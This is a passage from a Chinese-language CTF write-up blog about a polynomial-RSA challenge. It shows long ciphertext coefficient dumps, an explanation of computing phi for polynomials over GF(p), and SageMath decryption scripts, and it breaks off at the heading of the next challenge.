class="number">201</span> + <span class="number">2372929383</span>*x^<span class="number">200</span> + <span class="number">1323964787</span>*x^<span class="number">199</span> + <span class="number">1302258424</span>*x^<span class="number">198</span> + <span class="number">271875267</span>*x^<span class="number">197</span> + <span class="number">1297768962</span>*x^<span class="number">196</span> + <span class="number">2147341770</span>*x^<span class="number">195</span> + <span class="number">1665066191</span>*x^<span class="number">194</span> + <span class="number">2342921569</span>*x^<span class="number">193</span> + <span class="number">1450622685</span>*x^<span class="number">192</span> + <span class="number">1453466049</span>*x^<span class="number">191</span> + <span class="number">1105227173</span>*x^<span class="number">190</span> + <span class="number">2357717379</span>*x^<span class="number">189</span> + <span class="number">1044263540</span>*x^<span class="number">188</span> + <span class="number">697816284</span>*x^<span class="number">187</span> + <span class="number">647124526</span>*x^<span class="number">186</span> + <span class="number">1414769298</span>*x^<span class="number">185</span> + <span class="number">657373752</span>*x^<span class="number">184</span> + <span class="number">91863906</span>*x^<span class="number">183</span> + <span class="number">1095083181</span>*x^<span class="number">182</span> + <span class="number">658171402</span>*x^<span class="number">181</span> + <span class="number">75339882</span>*x^<span class="number">180</span> + <span class="number">2216678027</span>*x^<span class="number">179</span> + <span class="number">2208320155</span>*x^<span class="number">178</span> + <span class="number">1351845267</span>*x^<span class="number">177</span> + <span class="number">1740451894</span>*x^<span class="number">176</span> + <span class="number">1302531891</span>*x^<span class="number">175</span> + <span class="number">320751753</span>*x^<span class="number">174</span> + <span class="number">1303477598</span>*x^<span class="number">173</span> + <span class="number">783321123</span>*x^<span class="number">172</span> + <span class="number">1400145206</span>*x^<span class="number">171</span> + <span class="number">1379768234</span>*x^<span class="number">170</span> + <span class="number">1191445903</span>*x^<span class="number">169</span> + <span class="number">946530449</span>*x^<span class="number">168</span> + <span class="number">2008674144</span>*x^<span class="number">167</span> + <span class="number">2247371104</span>*x^<span class="number">166</span> + <span class="number">1267042416</span>*x^<span class="number">165</span> + <span class="number">1795774455</span>*x^<span class="number">164</span> + <span class="number">1976911493</span>*x^<span class="number">163</span> + <span class="number">167037165</span>*x^<span class="number">162</span> + <span class="number">1848717750</span>*x^<span class="number">161</span> + <span class="number">573072954</span>*x^<span class="number">160</span> + <span class="number">1126046031</span>*x^<span class="number">159</span> + <span class="number">376257986</span>*x^<span class="number">158</span> + <span class="number">1001726783</span>*x^<span class="number">157</span> + <span class="number">2250967824</span>*x^<span class="number">156</span> + <span class="number">2339380314</span>*x^<span class="number">155</span> + <span class="number">571922874</span>*x^<span class="number">154</span> + <span class="number">961000788</span>*x^<span class="number">153</span> + <span class="number">306686020</span>*x^<span class="number">152</span> + <span class="number">80717392</span>*x^<span class="number">151</span> + <span class="number">2454799241</span>*x^<span class="number">150</span> + <span class="number">1005427673</span>*x^<span class="number">149</span> + <span class="number">1032257735</span>*x^<span class="number">148</span> + <span class="number">593980163</span>*x^<span class="number">147</span> + <span class="number">1656568780</span>*x^<span class="number">146</span> + <span class="number">1865541316</span>*x^<span class="number">145</span> + <span class="number">2003844061</span>*x^<span class="number">144</span> + <span class="number">1265566902</span>*x^<span class="number">143</span> + <span class="number">573548790</span>*x^<span class="number">142</span> + <span class="number">494063408</span>*x^<span class="number">141</span> + <span class="number">1722266624</span>*x^<span class="number">140</span> + <span class="number">938551278</span>*x^<span class="number">139</span> + <span class="number">2284832499</span>*x^<span class="number">138</span> + <span class="number">597191613</span>*x^<span class="number">137</span> + <span class="number">476121126</span>*x^<span class="number">136</span> + <span class="number">1237943942</span>*x^<span class="number">135</span> + <span class="number">275861976</span>*x^<span class="number">134</span> + <span class="number">1603993606</span>*x^<span class="number">133</span> + <span class="number">1895285286</span>*x^<span class="number">132</span> + <span class="number">589034062</span>*x^<span class="number">131</span> + <span class="number">713986937</span>*x^<span class="number">130</span> + <span class="number">1206118526</span>*x^<span class="number">129</span> + <span class="number">311679750</span>*x^<span class="number">128</span> + <span class="number">1989860861</span>*x^<span class="number">127</span> + <span class="number">1551409650</span>*x^<span class="number">126</span> + <span class="number">2188452501</span>*x^<span class="number">125</span> + <span class="number">1175930901</span>*x^<span class="number">124</span> + <span class="number">1991529213</span>*x^<span class="number">123</span> + <span class="number">2019090583</span>*x^<span class="number">122</span> + <span class="number">215965300</span>*x^<span class="number">121</span> + <span class="number">532432639</span>*x^<span class="number">120</span> + <span class="number">1148806816</span>*x^<span class="number">119</span> + <span class="number">493362403</span>*x^<span class="number">118</span> + <span class="number">2166920790</span>*x^<span class="number">117</span> + <span class="number">185609624</span>*x^<span class="number">116</span> + <span class="number">184370704</span>*x^<span class="number">115</span> + <span class="number">2141702861</span>*x^<span class="number">114</span> + <span class="number">223551915</span>*x^<span class="number">113</span> + <span class="number">298497455</span>*x^<span class="number">112</span> + <span class="number">722376028</span>*x^<span class="number">111</span> + <span class="number">678813029</span>*x^<span class="number">110</span> + <span class="number">915121681</span>*x^<span class="number">109</span> + <span class="number">1107871854</span>*x^<span class="number">108</span> + <span class="number">1369194845</span>*x^<span class="number">107</span> + <span class="number">328165402</span>*x^<span class="number">106</span> + <span class="number">1792110161</span>*x^<span class="number">105</span> + <span class="number">798151427</span>*x^<span class="number">104</span> + <span class="number">954952187</span>*x^<span class="number">103</span> + <span class="number">471555401</span>*x^<span class="number">102</span> + <span class="number">68969853</span>*x^<span class="number">101</span> + <span class="number">453598910</span>*x^<span class="number">100</span> + <span class="number">2458706380</span>*x^<span class="number">99</span> + <span class="number">889221741</span>*x^<span class="number">98</span> + <span class="number">320515821</span>*x^<span class="number">97</span> + <span class="number">1549538476</span>*x^<span class="number">96</span> + <span class="number">909607400</span>*x^<span class="number">95</span> + <span class="number">499973742</span>*x^<span class="number">94</span> + <span class="number">552728308</span>*x^<span class="number">93</span> + <span class="number">1538610725</span>*x^<span class="number">92</span> + <span class="number">186272117</span>*x^<span class="number">91</span> + <span class="number">862153635</span>*x^<span class="number">90</span> + <span class="number">981463824</span>*x^<span class="number">89</span> + <span class="number">2400233482</span>*x^<span class="number">88</span> + <span class="number">1742475067</span>*x^<span class="number">87</span> + <span class="number">437801940</span>*x^<span class="number">86</span> + <span class="number">1504315277</span>*x^<span class="number">85</span> + <span class="number">1756497351</span>*x^<span class="number">84</span> + <span class="number">197089583</span>*x^<span class="number">83</span> + <span class="number">2082285292</span>*x^<span class="number">82</span> + <span class="number">109369793</span>*x^<span class="number">81</span> + <span class="number">2197572728</span>*x^<span class="number">80</span> + <span class="number">107235697</span>*x^<span class="number">79</span> + <span class="number">567322310</span>*x^<span class="number">78</span> + <span class="number">1755205142</span>*x^<span class="number">77</span> + <span class="number">1089091449</span>*x^<span class="number">76</span> + <span class="number">1993836978</span>*x^<span class="number">75</span> + <span class="number">2393709429</span>*x^<span class="number">74</span> + <span class="number">170647828</span>*x^<span class="number">73</span> + <span class="number">1205814501</span>*x^<span class="number">72</span> + <span class="number">2444570340</span>*x^<span class="number">71</span> + <span class="number">328372190</span>*x^<span class="number">70</span> + <span class="number">1929704306</span>*x^<span class="number">69</span> + <span class="number">717796715</span>*x^<span class="number">68</span> + <span class="number">1057597610</span>*x^<span class="number">67</span> + <span class="number">482243092</span>*x^<span class="number">66</span> + <span class="number">277530014</span>*x^<span class="number">65</span> + <span class="number">2393168828</span>*x^<span class="number">64</span> + <span class="number">12380707</span>*x^<span class="number">63</span> + <span class="number">1108646500</span>*x^<span class="number">62</span> + <span class="number">637721571</span>*x^<span class="number">61</span> + <span class="number">604983755</span>*x^<span class="number">60</span> + <span class="number">1142068056</span>*x^<span class="number">59</span> + <span class="number">1911643955</span>*x^<span class="number">58</span> + <span class="number">1713852330</span>*x^<span class="number">57</span> + <span class="number">1757273231</span>*x^<span class="number">56</span> + <span class="number">1778819295</span>*x^<span class="number">55</span> + <span class="number">957146826</span>*x^<span class="number">54</span> + <span class="number">900005615</span>*x^<span class="number">53</span> + <span class="number">521467961</span>*x^<span class="number">52</span> + <span class="number">1255707235</span>*x^<span class="number">51</span> + <span class="number">861871574</span>*x^<span class="number">50</span> + <span class="number">397953653</span>*x^<span class="number">49</span> + <span class="number">1259753202</span>*x^<span class="number">48</span> + <span class="number">471431762</span>*x^<span class="number">47</span> + <span class="number">1245956917</span>*x^<span class="number">46</span> + <span class="number">1688297180</span>*x^<span class="number">45</span> + <span class="number">1536178591</span>*x^<span class="number">44</span> + <span class="number">1833258462</span>*x^<span class="number">43</span> + <span class="number">1369087493</span>*x^<span class="number">42</span> + <span class="number">459426544</span>*x^<span class="number">41</span> + <span class="number">418389643</span>*x^<span class="number">40</span> + <span class="number">1800239647</span>*x^<span class="number">39</span> + <span class="number">2467433889</span>*x^<span class="number">38</span> + <span class="number">477713059</span>*x^<span class="number">37</span> + <span class="number">1898813986</span>*x^<span class="number">36</span> + <span class="number">2202042708</span>*x^<span class="number">35</span> + <span class="number">894088738</span>*x^<span class="number">34</span> + <span class="number">1204601190</span>*x^<span class="number">33</span> + <span class="number">1592921228</span>*x^<span class="number">32</span> + <span class="number">2234027582</span>*x^<span class="number">31</span> + <span class="number">1308900201</span>*x^<span class="number">30</span> + <span class="number">461430959</span>*x^<span class="number">29</span> + <span class="number">718926726</span>*x^<span class="number">28</span> + <span class="number">2081988029</span>*x^<span class="number">27</span> + <span class="number">1337342428</span>*x^<span class="number">26</span> + <span class="number">2039153142</span>*x^<span class="number">25</span> + <span class="number">1364177470</span>*x^<span class="number">24</span> + <span class="number">613659517</span>*x^<span class="number">23</span> + <span class="number">853968854</span>*x^<span class="number">22</span> + <span class="number">1013582418</span>*x^<span class="number">21</span> + <span class="number">1167857934</span>*x^<span class="number">20</span> + <span class="number">2014147362</span>*x^<span class="number">19</span> + <span class="number">1083466865</span>*x^<span class="number">18</span> + <span class="number">1091690302</span>*x^<span class="number">17</span> + <span class="number">302196939</span>*x^<span class="number">16</span> + <span class="number">1946675573</span>*x^<span class="number">15</span> + <span class="number">2450124113</span>*x^<span class="number">14</span> + <span class="number">1199066291</span>*x^<span class="number">13</span> + <span class="number">401889502</span>*x^<span class="number">12</span> + <span class="number">712045611</span>*x^<span class="number">11</span> + <span class="number">1850096904</span>*x^<span class="number">10</span> + <span class="number">1808400208</span>*x^<span class="number">9</span> + <span class="number">1567687877</span>*x^<span class="number">8</span> + <span class="number">2013445952</span>*x^<span class="number">7</span> + <span class="number">2435360770</span>*x^<span class="number">6</span> + <span class="number">2414019676</span>*x^<span class="number">5</span> + <span class="number">2277377050</span>*x^<span class="number">4</span> + <span class="number">2148341337</span>*x^<span class="number">3</span> + <span class="number">1073721716</span>*x^<span class="number">2</span> + <span class="number">1045363399</span>*x + <span class="number">1809685811</span></span><br><span class="line"></span><br><span class="line">m^<span class="number">0x10001</span>%N:  </span><br><span class="line"><span class="number">922927962</span>*x^<span class="number">254</span> + <span class="number">1141958714</span>*x^<span class="number">253</span> + <span class="number">295409606</span>*x^<span class="number">252</span> + <span class="number">1197491798</span>*x^<span class="number">251</span> + <span class="number">2463440866</span>*x^<span class="number">250</span> + <span class="number">1671460946</span>*x^<span class="number">249</span> + <span class="number">967543123</span>*x^<span class="number">248</span> + <span class="number">119796323</span>*x^<span class="number">247</span> + <span class="number">1172760592</span>*x^<span class="number">246</span> + <span class="number">770640267</span>*x^<span class="number">245</span> + <span class="number">1093816376</span>*x^<span class="number">244</span> + <span class="number">196379610</span>*x^<span class="number">243</span> + <span class="number">2205270506</span>*x^<span class="number">242</span> + <span class="number">459693142</span>*x^<span class="number">241</span> + <span class="number">829093322</span>*x^<span class="number">240</span> + <span class="number">816440689</span>*x^<span class="number">239</span> + <span class="number">648546871</span>*x^<span class="number">238</span> + <span class="number">1533372161</span>*x^<span class="number">237</span> + <span class="number">1349964227</span>*x^<span class="number">236</span> + <span class="number">2132166634</span>*x^<span class="number">235</span> + <span class="number">403690250</span>*x^<span class="number">234</span> + <span class="number">835793319</span>*x^<span class="number">233</span> + <span class="number">2056945807</span>*x^<span class="number">232</span> + <span class="number">480459588</span>*x^<span class="number">231</span> + <span class="number">1401028924</span>*x^<span class="number">230</span> + <span class="number">2231055325</span>*x^<span class="number">229</span> + <span class="number">1716893325</span>*x^<span class="number">228</span> + <span class="number">16299164</span>*x^<span class="number">227</span> + <span class="number">1125072063</span>*x^<span class="number">226</span> + <span class="number">1903340994</span>*x^<span class="number">225</span> + <span class="number">1372971897</span>*x^<span class="number">224</span> + <span class="number">242927971</span>*x^<span class="number">223</span> + <span class="number">711296789</span>*x^<span class="number">222</span> + <span class="number">535407256</span>*x^<span class="number">221</span> + <span class="number">976773179</span>*x^<span class="number">220</span> + <span class="number">533569974</span>*x^<span class="number">219</span> + <span class="number">501041034</span>*x^<span class="number">218</span> + <span class="number">326232105</span>*x^<span class="number">217</span> + <span class="number">2248775507</span>*x^<span class="number">216</span> + <span class="number">1010397596</span>*x^<span class="number">215</span> + <span class="number">1641864795</span>*x^<span class="number">214</span> + <span class="number">1365178317</span>*x^<span class="number">213</span> + <span class="number">1038477612</span>*x^<span class="number">212</span> + <span class="number">2201213637</span>*x^<span class="number">211</span> + <span class="number">760847531</span>*x^<span class="number">210</span> + <span class="number">2072085932</span>*x^<span class="number">209</span> + <span class="number">168159257</span>*x^<span class="number">208</span> + <span class="number">70202009</span>*x^<span class="number">207</span> + <span class="number">1193933930</span>*x^<span class="number">206</span> + <span class="number">1559162272</span>*x^<span class="number">205</span> + <span class="number">1380642174</span>*x^<span class="number">204</span> + <span class="number">1296625644</span>*x^<span class="number">203</span> + <span class="number">1338288152</span>*x^<span class="number">202</span> + <span class="number">843839510</span>*x^<span class="number">201</span> + <span class="number">460174838</span>*x^<span class="number">200</span> + <span class="number">660412151</span>*x^<span class="number">199</span> + <span class="number">716865491</span>*x^<span class="number">198</span> + <span class="number">772161222</span>*x^<span class="number">197</span> + <span class="number">924177515</span>*x^<span class="number">196</span> + <span class="number">1372790342</span>*x^<span class="number">195</span> + <span class="number">320044037</span>*x^<span class="number">194</span> + <span class="number">117027412</span>*x^<span class="number">193</span> + <span class="number">814803809</span>*x^<span class="number">192</span> + <span class="number">1175035545</span>*x^<span class="number">191</span> + <span class="number">244769161</span>*x^<span class="number">190</span> + <span class="number">2116927976</span>*x^<span class="number">189</span> + <span class="number">617780431</span>*x^<span class="number">188</span> + <span class="number">342577832</span>*x^<span class="number">187</span> + <span class="number">356586691</span>*x^<span class="number">186</span> + <span class="number">695795444</span>*x^<span class="number">185</span> + <span class="number">281750528</span>*x^<span class="number">184</span> + <span class="number">133432552</span>*x^<span class="number">183</span> + <span class="number">741747447</span>*x^<span class="number">182</span> + <span class="number">2138036298</span>*x^<span class="number">181</span> + <span class="number">524386605</span>*x^<span class="number">180</span> + <span class="number">1231287380</span>*x^<span class="number">179</span> + <span class="number">1246706891</span>*x^<span class="number">178</span> + <span class="number">69277523</span>*x^<span class="number">177</span> + <span class="number">2124927225</span>*x^<span class="number">176</span> + <span class="number">2334697345</span>*x^<span class="number">175</span> + <span class="number">1769733543</span>*x^<span class="number">174</span> + <span class="number">2248037872</span>*x^<span class="number">173</span> + <span class="number">1899902290</span>*x^<span class="number">172</span> + <span class="number">409421149</span>*x^<span class="number">171</span> + <span class="number">1223261878</span>*x^<span class="number">170</span> + <span class="number">666594221</span>*x^<span class="number">169</span> + <span class="number">1795456341</span>*x^<span class="number">168</span> + <span class="number">406003299</span>*x^<span class="number">167</span> + <span class="number">992699270</span>*x^<span class="number">166</span> + <span class="number">2201384104</span>*x^<span class="number">165</span> + <span class="number">907692883</span>*x^<span class="number">164</span> + <span class="number">1667882231</span>*x^<span class="number">163</span> + <span class="number">1414341647</span>*x^<span class="number">162</span> + <span class="number">1592159752</span>*x^<span class="number">161</span> + <span class="number">28054099</span>*x^<span class="number">160</span> + <span class="number">2184618098</span>*x^<span class="number">159</span> + <span class="number">2047102725</span>*x^<span class="number">158</span> + <span class="number">103202495</span>*x^<span class="number">157</span> + <span class="number">1803852525</span>*x^<span class="number">156</span> + <span class="number">446464179</span>*x^<span class="number">155</span> + <span class="number">909116906</span>*x^<span class="number">154</span> + <span class="number">1541693644</span>*x^<span class="number">153</span> + <span class="number">166545130</span>*x^<span class="number">152</span> + <span class="number">2283548843</span>*x^<span class="number">151</span> + <span class="number">2348768005</span>*x^<span class="number">150</span> + <span class="number">71682607</span>*x^<span class="number">149</span> + <span class="number">484339546</span>*x^<span class="number">148</span> + <span class="number">669511666</span>*x^<span class="number">147</span> + <span class="number">2110974006</span>*x^<span class="number">146</span> + <span class="number">1634563992</span>*x^<span class="number">145</span> + <span class="number">1810433926</span>*x^<span class="number">144</span> + <span class="number">2388805064</span>*x^<span class="number">143</span> + <span class="number">1200258695</span>*x^<span class="number">142</span> + <span class="number">1555191384</span>*x^<span class="number">141</span> + <span class="number">363842947</span>*x^<span class="number">140</span> + <span class="number">1105757887</span>*x^<span class="number">139</span> + <span class="number">402111289</span>*x^<span class="number">138</span> + <span class="number">361094351</span>*x^<span class="number">137</span> + <span class="number">1788238752</span>*x^<span class="number">136</span> + <span class="number">2017677334</span>*x^<span class="number">135</span> + <span class="number">1506224550</span>*x^<span class="number">134</span> + <span class="number">648916609</span>*x^<span class="number">133</span> + <span class="number">2008973424</span>*x^<span class="number">132</span> + <span class="number">2452922307</span>*x^<span class="number">131</span> + <span class="number">1446527028</span>*x^<span class="number">130</span> + <span class="number">29659632</span>*x^<span class="number">129</span> + <span class="number">627390142</span>*x^<span class="number">128</span> + <span class="number">1695661760</span>*x^<span class="number">127</span> + <span class="number">734686497</span>*x^<span class="number">126</span> + <span class="number">227059690</span>*x^<span class="number">125</span> + <span class="number">1219692361</span>*x^<span class="number">124</span> + <span class="number">635166359</span>*x^<span class="number">123</span> + <span class="number">428703291</span>*x^<span class="number">122</span> + <span class="number">2334823064</span>*x^<span class="number">121</span> + <span class="number">204888978</span>*x^<span class="number">120</span> + <span class="number">1694957361</span>*x^<span class="number">119</span> + <span class="number">94211180</span>*x^<span class="number">118</span> + <span class="number">2207723563</span>*x^<span class="number">117</span> + <span class="number">872340606</span>*x^<span class="number">116</span> + <span class="number">46197669</span>*x^<span class="number">115</span> + <span class="number">710312088</span>*x^<span class="number">114</span> + <span class="number">305132032</span>*x^<span class="number">113</span> + <span class="number">1621042631</span>*x^<span class="number">112</span> + <span class="number">2023404084</span>*x^<span class="number">111</span> + <span class="number">2169254305</span>*x^<span class="number">110</span> + <span class="number">463525650</span>*x^<span class="number">109</span> + <span class="number">2349964255</span>*x^<span class="number">108</span> + <span class="number">626689949</span>*x^<span class="number">107</span> + <span class="number">2072533779</span>*x^<span class="number">106</span> + <span class="number">177264308</span>*x^<span class="number">105</span> + <span class="number">153948342</span>*x^<span class="number">104</span> + <span class="number">1992646054</span>*x^<span class="number">103</span> + <span class="number">2379817214</span>*x^<span class="number">102</span> + <span class="number">1396334187</span>*x^<span class="number">101</span> + <span class="number">2254165812</span>*x^<span class="number">100</span> + <span class="number">1300455472</span>*x^<span class="number">99</span> + <span class="number">2396842759</span>*x^<span class="number">98</span> + <span class="number">2398953180</span>*x^<span class="number">97</span> + <span class="number">88249450</span>*x^<span class="number">96</span> + <span class="number">1726340322</span>*x^<span class="number">95</span> + <span class="number">2004986735</span>*x^<span class="number">94</span> + <span class="number">2446249940</span>*x^<span class="number">93</span> + <span class="number">520126803</span>*x^<span class="number">92</span> + <span class="number">821544954</span>*x^<span class="number">91</span> + <span class="number">1177737015</span>*x^<span class="number">90</span> + <span class="number">676286546</span>*x^<span class="number">89</span> + <span class="number">1519043368</span>*x^<span class="number">88</span> + <span class="number">224894464</span>*x^<span class="number">87</span> + <span class="number">1742023262</span>*x^<span class="number">86</span> + <span class="number">142627164</span>*x^<span class="number">85</span> + <span class="number">1427710141</span>*x^<span class="number">84</span> + <span class="number">1504189919</span>*x^<span class="number">83</span> + <span class="number">688315682</span>*x^<span class="number">82</span> + <span class="number">1397842239</span>*x^<span class="number">81</span> + <span class="number">435187331</span>*x^<span class="number">80</span> + <span class="number">433176780</span>*x^<span class="number">79</span> + <span class="number">454834357</span>*x^<span class="number">78</span> + <span class="number">1046713282</span>*x^<span class="number">77</span> + <span class="number">1208458516</span>*x^<span class="number">76</span> + <span class="number">811240741</span>*x^<span class="number">75</span> + <span class="number">151611952</span>*x^<span class="number">74</span> + <span class="number">164192249</span>*x^<span class="number">73</span> + <span class="number">353336244</span>*x^<span class="number">72</span> + <span class="number">1779538914</span>*x^<span class="number">71</span> + <span class="number">1489144873</span>*x^<span class="number">70</span> + <span class="number">213140082</span>*x^<span class="number">69</span> + <span class="number">1874778522</span>*x^<span class="number">68</span> + <span class="number">908618863</span>*x^<span class="number">67</span> + <span class="number">1058334731</span>*x^<span class="number">66</span> + <span class="number">1706255211</span>*x^<span class="number">65</span> + <span class="number">708134837</span>*x^<span class="number">64</span> + <span class="number">1382118347</span>*x^<span class="number">63</span> + <span class="number">2111915733</span>*x^<span class="number">62</span> + <span class="number">1273497300</span>*x^<span class="number">61</span> + <span class="number">368639880</span>*x^<span class="number">60</span> + <span class="number">1652005004</span>*x^<span class="number">59</span> + <span class="number">1977610754</span>*x^<span class="number">58</span> + <span class="number">1412680185</span>*x^<span class="number">57</span> + <span class="number">2312775720</span>*x^<span class="number">56</span> + <span class="number">59793381</span>*x^<span class="number">55</span> + <span class="number">1345145822</span>*x^<span class="number">54</span> + <span class="number">627534850</span>*x^<span class="number">53</span> + <span class="number">2159477761</span>*x^<span class="number">52</span> + <span class="number">10450988</span>*x^<span class="number">51</span> + <span class="number">1479007796</span>*x^<span class="number">50</span> + <span class="number">2082579205</span>*x^<span class="number">49</span> + <span class="number">1158447154</span>*x^<span class="number">48</span> + <span class="number">126359830</span>*x^<span class="number">47</span> + <span class="number">393411272</span>*x^<span class="number">46</span> + <span class="number">2343384236</span>*x^<span class="number">45</span> + <span class="number">2191577465</span>*x^<span class="number">44</span> + <span class="number">1281188680</span>*x^<span class="number">43</span> + <span class="number">230049708</span>*x^<span class="number">42</span> + <span class="number">539600199</span>*x^<span class="number">41</span> + <span class="number">1711135601</span>*x^<span class="number">40</span> + <span class="number">1659775448</span>*x^<span class="number">39</span> + <span class="number">1716176055</span>*x^<span class="number">38</span> + <span class="number">904363231</span>*x^<span class="number">37</span> + <span class="number">2385749710</span>*x^<span class="number">36</span> + <span class="number">567278351</span>*x^<span class="number">35</span> + <span class="number">404199078</span>*x^<span class="number">34</span> + <span class="number">372670353</span>*x^<span class="number">33</span> + <span class="number">1286079784</span>*x^<span class="number">32</span> + <span class="number">1744355671</span>*x^<span class="number">31</span> + <span class="number">2316856064</span>*x^<span class="number">30</span> + <span class="number">2106475476</span>*x^<span class="number">29</span> + <span class="number">614988454</span>*x^<span class="number">28</span> + <span class="number">2149964943</span>*x^<span class="number">27</span> + <span class="number">1065233185</span>*x^<span class="number">26</span> + <span class="number">188130174</span>*x^<span class="number">25</span> + <span class="number">540415659</span>*x^<span class="number">24</span> + <span class="number">1031409799</span>*x^<span class="number">23</span> + <span class="number">1067085678</span>*x^<span class="number">22</span> + <span class="number">1005161755</span>*x^<span class="number">21</span> + <span class="number">249654085</span>*x^<span class="number">20</span> + <span class="number">1816791634</span>*x^<span class="number">19</span> + <span class="number">1437500292</span>*x^<span class="number">18</span> + <span class="number">448596413</span>*x^<span class="number">17</span> + <span class="number">2397497659</span>*x^<span class="number">16</span> + <span class="number">2353732701</span>*x^<span class="number">15</span> + <span class="number">2068949189</span>*x^<span class="number">14</span> + <span class="number">1826419168</span>*x^<span class="number">13</span> + <span class="number">1265366199</span>*x^<span class="number">12</span> + <span class="number">547031306</span>*x^<span class="number">11</span> + <span class="number">1016962374</span>*x^<span class="number">10</span> + <span class="number">160089486</span>*x^<span class="number">9</span> + <span class="number">2264803979</span>*x^<span class="number">8</span> + <span class="number">1081806194</span>*x^<span class="number">7</span> + <span class="number">824215340</span>*x^<span class="number">6</span> + <span class="number">497731793</span>*x^<span class="number">5</span> + <span class="number">45017166</span>*x^<span class="number">4</span> + <span class="number">317548920</span>*x^<span class="number">3</span> + <span class="number">1391127733</span>*x^<span class="number">2</span> + <span class="number">1752881284</span>*x + <span class="number">1290424106</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>多项式rsa，按道理，给了p应该就好分解了，但它是多项式rsa</p>
<p>看la佬的博客，有几点需要知道</p>
<ol>
<li>一般的数论知识可以完美迁移到群论上， 比如欧拉定理</li>
<li>对于欧拉函数$\varphi$来说，在数论中$\varphi (x)=x-1$（x是素数），但是对于不可约多项式$g(x)$，$\varphi(g(x))=p^n-1$（p为$GF(p)$的模，n为多项式最高项次数）。这里我暂且把$GF(p)$当成$Z_p^*$了</li>
</ol>
<p>看着代码理解吧</p>
<blockquote>
<p>解题代码</p>
</blockquote>
<p>首先构造以p为模的，关于x的多项式，这就相当于rsa中的p了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R.&lt;x&gt; = PolynomialRing(GF(p))</span><br></pre></td></tr></table></figure>

<p>然后下面这个我不知道什么意思</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br></pre></td></tr></table></figure>

<p>接下来就是熟悉的rsa步骤，分解pq，通过上面那个求欧拉函数的公式求phi，从而求得d，然后是emmmmm，自己看吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P, Q = N.factor()</span><br><span class="line">P, Q = P[<span class="number">0</span>], Q[<span class="number">0</span>]</span><br><span class="line">phi = (p ** P.degree() - <span class="number">1</span>) * (p ** Q.degree() - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">m = c ^ d</span><br><span class="line">m = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> m.<span class="built_in">list</span>()])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>

<p>另外la佬还赠送了两个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本1</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="comment">#已知p,n,m^e</span></span><br><span class="line">p=</span><br><span class="line">P = PolynomialRing(Zmod(p), name = <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = P.gen()</span><br><span class="line">e =</span><br><span class="line">n =</span><br><span class="line">c =</span><br><span class="line"></span><br><span class="line"><span class="comment">#分解N</span></span><br><span class="line">q1, q2 = n.factor()</span><br><span class="line">q1, q2 = q1[<span class="number">0</span>], q2[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#求φ，注意求法，</span></span><br><span class="line">phi = (p**q1.degree() - <span class="number">1</span>) * (p**q2.degree() - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> gcd(e, phi) == <span class="number">1</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#取多项式系数</span></span><br><span class="line">flag = <span class="built_in">bytes</span>(m.coefficients())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: &quot;</span>, flag.decode())</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本2</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="comment">#已知p=2,n,e,c</span></span><br><span class="line">p =</span><br><span class="line">P = PolynomialRing(GF(p), name = <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = P.gen()</span><br><span class="line">e =</span><br><span class="line">n =</span><br><span class="line">R.&lt;a&gt; = GF(<span class="number">2</span>^<span class="number">2049</span>)</span><br><span class="line">c = []</span><br><span class="line"></span><br><span class="line">q1, q2 = n.factor()</span><br><span class="line">q1, q2 = q1[<span class="number">0</span>], q2[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">phi = (p**q1.degree() - <span class="number">1</span>) * (p**q2.degree() - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> gcd(e, phi) == <span class="number">1</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> cc <span class="keyword">in</span> c:</span><br><span class="line">    cc = P(R.fetch_int(cc))</span><br><span class="line">    m = <span class="built_in">pow</span>(cc,d,n)</span><br><span class="line">    m = R(P(m)).integer_representation()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    ans += <span class="built_in">chr</span>(m)</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>

<p>试过了第一个可以跑，也发现.sage文件真正的用法，之前晓得了在sage里跑python文件，但是有些语法可以在sageshell里面运行，但是放在python文件中却是不行，这个时候可以将拓展名改成sage再在sage里load</p>
<p>当然还有一些py2和py3之间转换的屑</p>
<p>第二个脚本有报错，看不懂</p>
<h2 id="unusuarsa4"><a href="#unusuarsa4" class="headerlink" title="unusuarsa4"></a>unusuarsa4</h2><blockquote>
<p>题目描述</p>
</blockquote>
